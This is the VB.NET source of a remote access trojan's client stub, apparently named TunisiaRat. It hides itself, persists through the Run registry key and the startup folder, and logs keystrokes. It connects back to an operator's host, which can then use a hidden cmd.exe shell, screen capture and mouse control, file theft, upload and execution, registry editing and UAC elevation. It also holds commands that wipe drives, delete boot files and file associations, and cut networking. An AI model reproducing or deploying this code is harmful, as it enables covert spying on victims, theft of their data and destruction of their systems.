
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Principal
Imports System.Text
Imports Microsoft.Win32
Imports System.Management
Imports System.Text.RegularExpressions

Public Class Form1

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetWindowText(hWnd As IntPtr, text As StringBuilder, count As Integer) As Integer
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetWindowTextLength(hWnd As IntPtr) As Integer
    End Function
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16

    Const FileSplitter As String = "|FS|"
    Dim stub, HOST, HOST2, Port, Xargs() As String

    Public WithEvents C As New SocketClient
    Public Yy As String = "|SPX|"
    Public cap As New CRDP

    'Public Variables
    Dim Botid As String = ""
    Dim Version As String = ""
    Dim InstallDir As String = ""
    Dim InstallPath As String = ""
    Dim InstallFname As String = ""
    Dim Reg_Key As String = ""
    Dim Start_Up As Boolean
    Public PasswordSocket As String = ""
    Dim Keylogdir As String = ""
    Dim av1 As String = ""
    Public kl As New njLogger


    Dim connectionfailover = 0
    'TaskManager Variables
    Private Const UPDATEINIFILE = &H1
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Const SW_SHOWNORMAL As Integer = 1
    Private Const SW_SHOWMINIMIZED As Integer = 2
    Private Declare Function ShowWindow Lib "user32" (ByVal handle As IntPtr, ByVal nCmdShow As Integer) As Integer
    Private Const SW_SHOWMAXIMIZED As Integer = 3
    Private Declare Function FindWindowEx Lib "user32.dll" Alias _
"FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String,
ByVal lpsz2 As String) As Int32 'Find Child Window Of External Window

    Private Pro As Object

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
#Region "Stub"


        CheckForIllegalCrossThreadCalls = False

        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        Dim stubb As String = Space(LOF(1))
        FileGet(1, stubb)
        FileClose(1)
        Dim ArgsX() As String = Split(stubb, FileSplitter)

        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False

        HOST = ArgsX(1)
        Port = Convert.ToInt32(ArgsX(2))
        Botid = ArgsX(3)
        Version = ArgsX(4)
        InstallDir = ArgsX(5)
        InstallPath = ArgsX(6)
        InstallFname = ArgsX(7)

        Reg_Key = ArgsX(8)
        Start_Up = ArgsX(9)
        PasswordSocket = ArgsX(10)
        HOST2 = ArgsX(11)


        If ArgsX(12) = "-" Then
            My.Settings.Notes = "-"
            My.Settings.Save()
        Else
            My.Settings.Notes = ArgsX(13)
            My.Settings.Save()
        End If



        Dim FileToCopy As String
        Dim NewCopy As String
        If InstallDir = "User" Then
            InstallDir = Path.GetTempPath()
        ElseIf InstallDir = "System" Then
            InstallDir = "C:\Windows\System32\"
        ElseIf InstallDir = "Program" Then
            InstallDir = My.Computer.FileSystem.SpecialDirectories.ProgramFiles & "\"
        End If

        FileToCopy = Application.ExecutablePath
        NewCopy = InstallDir & InstallPath + "\" + InstallFname

        If System.IO.File.Exists(NewCopy) Then
            'Pass REM
        Else
            'Install
            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
            regKey.SetValue(Reg_Key, InstallDir + InstallPath + "\" + InstallFname, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()

            'Create Folder For Final File
            If (Not System.IO.Directory.Exists(InstallDir + InstallPath)) Then
                System.IO.Directory.CreateDirectory(InstallDir + InstallPath)
            End If

            'Delete Existing File
            If System.IO.File.Exists(NewCopy) Then
                File.Delete(NewCopy)
            End If

            'Create New File
            If System.IO.File.Exists(FileToCopy) = True Then
                System.IO.File.Copy(FileToCopy, NewCopy)
            End If

            'Add To Startup
            If Start_Up = True Then
                Try
                    Dim startup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    IO.File.Copy(Application.ExecutablePath, startup & "\" & InstallFname)
                Catch : End Try
            End If
        End If


        kl.Start()

        C.Connect(HOST, Port)


#End Region
    End Sub


    Public GetProcesses() As Process
    Function AVDetect()
        Dim antivirus As String
        Dim procList() As Process = Process.GetProcesses()
        Dim i As Integer = 0
        Do
            Dim strProcName As String = procList(i).ProcessName
            If strProcName = "ekrn" Then
                antivirus = "NOD32"
            ElseIf strProcName = "avgcc" Then
                antivirus = "AVG"
            ElseIf strProcName = "avgnt" Then
                antivirus = "Avira"
            ElseIf strProcName = "ahnsd" Then
                antivirus = "AhnLab-V3"
            ElseIf strProcName = "bdss" Then
                antivirus = "BitDefender"
            ElseIf strProcName = "bdv" Then
                antivirus = "ByteHero"
            ElseIf strProcName = "clamav" Then
                antivirus = "ClamAV"
            ElseIf strProcName = "fpavserver" Then
                antivirus = "F-Prot"
            ElseIf strProcName = "fssm32" Then
                antivirus = "F-Secure"
            ElseIf strProcName = "avkcl" Then
                antivirus = "GData"
            ElseIf strProcName = "engface" Then
                antivirus = "Jiangmin"
            ElseIf strProcName = "avp" Then
                antivirus = "Kaspersky"
            ElseIf strProcName = "updaterui" Then
                antivirus = "McAfee"
            ElseIf strProcName = "msmpeng" Then
                antivirus = "Microsoft Security Essentials"
            ElseIf strProcName = "msseces" Then
                antivirus = "Windows Defender"
            ElseIf strProcName = "zanda" Then
                antivirus = "Norman"
            ElseIf strProcName = "npupdate" Then
                antivirus = "nProtect"
            ElseIf strProcName = "inicio" Then
                antivirus = "Panda"
            ElseIf strProcName = "sagui" Then
                antivirus = "Prevx"
            ElseIf strProcName = "Norman" Then
                antivirus = "Sophos"
            ElseIf strProcName = "savservice" Then
                antivirus = "Sophos"
            ElseIf strProcName = "saswinlo" Then
                antivirus = "SUPERAntiSpyware"
            ElseIf strProcName = "spbbcsvc" Then
                antivirus = "Symantec"
            ElseIf strProcName = "thd32" Then
                antivirus = "TheHacker"
            ElseIf strProcName = "ufseagnt" Then
                antivirus = "TrendMicro"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "sbamtray" Then
                antivirus = "VIPRE"
            ElseIf strProcName = "vrmonsvc" Then
                antivirus = "ViRobot"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "vbcalrt" Then
                antivirus = "VirusBuster"
            Else
                antivirus = "Not Found"
            End If
            Dim iProcID As Integer = procList(i).Id
            i = i + 1
        Loop Until (antivirus <> "Not Found" Or i > procList.Length - 1)
        If i > procList.Length - 1 Then
            antivirus = "Not Found"
        End If
        Return antivirus
    End Function
    Public Function Getperms()
        'Get Perm
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Dim isElevated As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
        Dim Perms As String = ""
        If isElevated = True Then
            Return "Admin"
        Else
            Return "User"
        End If
    End Function
#Region "Socket Events"
    Private Sub Connected() Handles C.Connected

    End Sub

    Private Sub Disconnected() Handles C.Disconnected
        ' Reconnect
        If connectionfailover = 0 Then
            connectionfailover = 1
            Try
                C.Connect(HOST2, Port)
            Catch : End Try
        ElseIf connectionfailover = 1 Then
            connectionfailover = 0
            Try
                C.Connect(HOST, Port)
            Catch : End Try
            connectionfailover = 0
        End If


    End Sub


    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Dim Npc = Environment.UserName & "@" & Environment.MachineName
        Try
            Select Case A(0)
                Case "~"
                    If A(1) = PasswordSocket Then
                        Dim pc As String = Environment.MachineName & "/" & Environment.UserName
                        Dim osVersion As String = My.Computer.Info.OSFullName.ToString()
                        Dim cpu As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
                        Dim notes As String = ""
                        Dim filename As String = ""
                        If My.Settings.InstallDate = "" Then
                            My.Settings.InstallDate = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss")
                            My.Settings.Save()
                        End If

                        If My.Settings.Notes = "" Then
                            notes = " "
                        Else
                            notes = My.Settings.Notes
                        End If
                        av1 = AVDetect() 'Check AV

                        filename = Path.GetFileName(Application.ExecutablePath)

                        C.Send("~" & Yy & pc & Yy & Botid & Yy & Version & Yy & osVersion & Yy & cpu & Yy & Getperms() & Yy & notes & Yy & My.Settings.InstallDate & Yy & filename & Yy & av1 & Yy & GetFirewall())
                    Else
                        End
                    End If
                Case "openkl"
                    C.Send("openkl")
                Case "Getloges"
                    Try
                        C.Send("loges" & Yy & kl.Logs)
                    Catch : End Try
                Case "KillProcess"

                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))

                            RunningProcess.Kill()
                        Next
                    Next
                Case "getdesk"
                    Dim m As Image = CaptureDesktop()
                    Dim cc As New ImageConverter
                    Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                    C.Send("getdesk" & Yy & Convert.ToBase64String(bb))

                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim sl As String = "ProcessSplit"
                    For Each xd As Process In Process.GetProcesses
                        Try
                            allProcess += xd.ProcessName & "|" & xd.Id & "|" & xd.MainModule.FileName & "|" & xd.PrivateMemorySize64 & "|" & xd.StartTime & sl
                        Catch
                            allProcess += xd.ProcessName & "|" & xd.Id & "|" & "-" & "|" & xd.PrivateMemorySize64 & "|" & "-" & sl
                        End Try
                    Next

                    C.Send("ProcessManager" & Yy & System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath) & Yy & allProcess)
                Case "SProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        C.Send("SP")
                    Next

                Case "SSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim sh = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWNORMAL)
                        C.Send("SP")
                    Next
                Case "SSSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim hi = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWMINIMIZED)
                        C.Send("SP")
                    Next
                Case "Registry Editor"
                    C.Send("openRG")
                Case "openRG"
                    C.Send("openRG")
                Case "RG" ' Registry 
                    Try
                        Dim kk As Object = GetKey(A(2))
                        Select Case A(1)
                            Case "~" ' send keys under key+ send values 
                                Dim s As String = "RG" & Yy & "~" & Yy & A(2) & Yy
                                Dim o As String = ""
                                For Each xe As String In kk.GetSubKeyNames
                                    If xe.Contains("\") = False Then
                                        o += xe & Yy
                                    End If
                                Next
                                For Each xs As String In kk.GetValueNames
                                    o += xs & "/" & kk.GetValueKind(xs).ToString & "/" & kk.GetValue(xs, "").ToString & Yy
                                Next
                                C.Send(s & o)
                            Case "!" ' Set Value
                                kk.SetValue(A(3), A(4), A(5))
                            Case "@5" ' delete value
                                kk.DeleteValue(A(3), False)
                            Case "#" ' creat key
                                kk.CreateSubKey(A(3))
                            Case "$" ' delete key
                                kk.DeleteSubKeyTree(A(3))
                        End Select
                    Catch
                        C.Send("RG" & Yy & "Can't access to feeds.")
                    End Try

                Case "openshell" ' start remote shell
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = New Process
                    Pro.StartInfo.RedirectStandardOutput = True
                    Pro.StartInfo.RedirectStandardInput = True
                    Pro.StartInfo.RedirectStandardError = True
                    Pro.StartInfo.FileName = "cmd.exe"
                    Pro.StartInfo.RedirectStandardError = True
                    AddHandler CType(Pro, Process).OutputDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).ErrorDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).Exited, AddressOf ex
                    Pro.StartInfo.UseShellExecute = False
                    Pro.StartInfo.CreateNoWindow = True
                    Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Pro.EnableRaisingEvents = True
                    C.Send("openshell")
                    Pro.Start()
                    Pro.BeginErrorReadLine()
                    Pro.BeginOutputReadLine()
                Case "rs"
                    Pro.StandardInput.WriteLine(DEB(A(1)))
                Case "rsc"
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = Nothing
                Case "sendinformation"
                    Dim time, h, m, s As Integer
                    time = My.Computer.Clock.TickCount
                    h = time \ 3600000
                    m = (time Mod 3600000) \ 60000
                    s = ((time Mod 3600000) Mod 60000) / 1000
                    Dim ab, bb, cb, db, eb, fb, gb As String
                    ab = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")
                    bb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "")
                    cb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "")
                    db = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "")
                    eb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", "")
                    fb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    gb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", "")
                    Dim value As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\TunisiaRat", "ID", "")
                    C.Send("sendinformation" & Yy & Environment.MachineName & Yy & Environment.UserName & Yy & My.Computer.Info.OSFullName & Yy & My.Computer.Info.OSPlatform & Yy & av1 & Yy & GetSystemRAMSize() & Yy & Version & Yy & My.Computer.Clock.LocalTime & Yy & h & ":" & m & ":" & s & Yy & Environment.CurrentDirectory & Yy & Environment.SystemDirectory & Yy & Environment.UserDomainName & Yy & Environment.UserInteractive & Yy & Environment.WorkingSet & Yy & My.Computer.Info.OSVersion & Yy & My.Computer.Info.InstalledUICulture.ToString & Yy & System.Environment.CommandLine & Yy & Port & Yy & Application.ExecutablePath & Yy & ab & Yy & bb & Yy & cb & Yy & db & Yy & eb & Yy & fb & Yy & gb & Yy & value)

                Case "!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "@" ' Start Capture
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))
                Case "|||"
                    C.Send("|||")
                Case "GetDrives"
                    C.Send("FileManager" & Yy & getDrives())
                Case "downloadfile"
                    C.Send("downloadedfile" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy & A(2))
                Case "sendfileto"
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    C.Send("UploadDone")
                Case "notes"
                    C.Send("addnote" & Yy & My.Settings.Notes)
                Case "OpenPro"
                    C.Send("OpenPro" & Yy & Npc)
                Case "noteupdate"
                    My.Settings.Notes = A(1)
                    My.Settings.Save()

                    C.Send("noteupdated" & Yy & My.Settings.Notes)
                Case "FileManager"
                    Try
                        C.Send("FileManager" & Yy & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        C.Send("FileManager" & Yy & "Error")
                    End Try
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))
                    End Select
                Case "Execute"
                    Process.Start(A(1))
                Case "addstartup"
                    Try
                        Dim startup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                        IO.File.Copy(A(1) & A(2), startup & "\" & A(2))
                    Catch : End Try
                Case "getdesktoppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "gettemppath"
                    Dim specialfolder As String
                    specialfolder = IO.Path.GetTempPath
                    C.Send("getpath" & Yy & specialfolder)

                Case "getstartuppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    C.Send("getpath" & Yy & specialfolder & "\")

                Case "getmydocumentspath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                    'Uninstall
                    Uninstall()

                Case "keylogsend"
                    C.Send("keylogger")

                Case "keylogsendupdate"
                    Dim fileReader As String
                    Try
                        C.Send("keylogs" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(Path.GetTempPath & "\" & Keylogdir & "\lg1.html")))
                    Catch : End Try

                Case "elevate"
                    Dim process As System.Diagnostics.Process = Nothing
                    Dim processStartInfo As System.Diagnostics.ProcessStartInfo
                    processStartInfo = New System.Diagnostics.ProcessStartInfo()
                    processStartInfo.FileName = Application.ExecutablePath
                    processStartInfo.Verb = "runas"

                    processStartInfo.Arguments = ""
                    processStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal
                    processStartInfo.UseShellExecute = True

                    process = System.Diagnostics.Process.Start(processStartInfo)
                    End
                Case "bluescreenofdeath"
                    Dim bsd As String = "@echo off
                    delete %systemdrive%\*.* /f /s "
                    Shell(bsd)
                Case "delsys32"
                    Dim bsd As String = "@echo off
                    attrib -r -s -h c:\autoexec.bat
                    del c:\autoexec.bat
                    attrib -r -s -h c:\boot.ini
                    del c:\boot.ini
                    attrib -r -s -h c:\ntldr
                    del c:\ntldr
                    attrib -r -s -h c:\windows\win.ini
                    del c:\windows\win.ini "
                    Shell(bsd)
                Case "delregwin"
                    Dim bsd As String = "@echo off
                    START reg delete HKCR/.exe
                    START reg delete HKCR/.dll
                    START reg delete HKCR/* "
                    Shell(bsd)
                Case "diseth"
                    Dim bsd As String = "echo @echo off>c:windowswimn32.bat
                    echo break off>>c:windowswimn32.bat
                    echo ipconfig/release_all>>c:windowswimn32.bat
                    echo end>>c:windowswimn32.bat
                    reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
                    reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window "
                    Shell(bsd)
                Case "delwin"
                    Dim bsd As String = "rd/s/q/ D:\
                    rd/s/q/ C:\
                    rd/s/q/ E:\"
                    Shell(bsd)
                Case "uninstall"
                    Uninstall()
                Case "restart"
                    Application.Restart()
                    End
                Case "close"
                    End
            End Select
        Catch ex As Exception
        End Try

    End Sub
#End Region
    Public Function ENB(ByRef s As String) As String ' Encode base64
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String ' Decode Base64
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Private Sub RS(ByVal a As Object, ByVal e As Object) 'Handles k.OutputDataReceived
        Try
            C.Send("rs" & Yy & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        Process.Start(Application.ExecutablePath)
    End Sub

    Private Sub Form1_FormClosing_1(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Process.Start(Application.ExecutablePath)
    End Sub

    Private Sub ex()
        Try
            C.Send("rsc" & Yy)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        For Each t As ProcessThread In process.Threads
            Dim th As IntPtr
            th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
            If th <> IntPtr.Zero Then
                SuspendThread(th)
                CloseHandle(th)
            End If
        Next
    End Sub
    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey ' get registry Key
        Dim k As String
        If key.StartsWith(Registry.ClassesRoot.Name) Then
            k = key.Replace(Registry.ClassesRoot.Name & "\", "")
            Return Registry.ClassesRoot.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.CurrentUser.Name) Then
            k = key.Replace(Registry.CurrentUser.Name & "\", "")
            Return Registry.CurrentUser.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.LocalMachine.Name) Then
            k = key.Replace(Registry.LocalMachine.Name & "\", "")
            Return Registry.LocalMachine.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.Users.Name) Then
            k = key.Replace(Registry.Users.Name & "\", "")
            Return Registry.Users.OpenSubKey(k, True)
        End If
        Return Nothing
    End Function
    Sub Uninstall()
        Try
            My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", True).DeleteValue(Reg_Key)
        Catch : End Try

        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")

        sb.AppendLine("taskkill /f /im """ & Process.GetCurrentProcess.Id.ToString & """ ")
        sb.AppendLine("del """ & Application.ExecutablePath & """ ")

        Dim startupunin As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & InstallFname
        sb.AppendLine("del """ & startupunin & """ ")

        Dim logdel As String = Path.GetTempPath & "\" & Keylogdir & "\lg1.html"
        sb.AppendLine("del """ & logdel & """ ")

        Dim tempff As String = Path.GetTempPath & "\" & InstallPath & "\" & InstallFname
        sb.AppendLine("del """ & tempff & """ ")

        sb.AppendLine("DEL ""%~f0"" ")

        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Dim r As New Random
        Dim tmpbat As New StringBuilder
        For i As Integer = 1 To 8
            Dim idx As Integer = r.Next(0, 35)
            tmpbat.Append(s.Substring(idx, 1))
        Next

        IO.File.WriteAllText(Directory.GetCurrentDirectory() & "\" & tmpbat.ToString & ".bat", sb.ToString())
        Shell(Directory.GetCurrentDirectory() & "\" & tmpbat.ToString & ".bat", AppWinStyle.Hide)

    End Sub

End Class
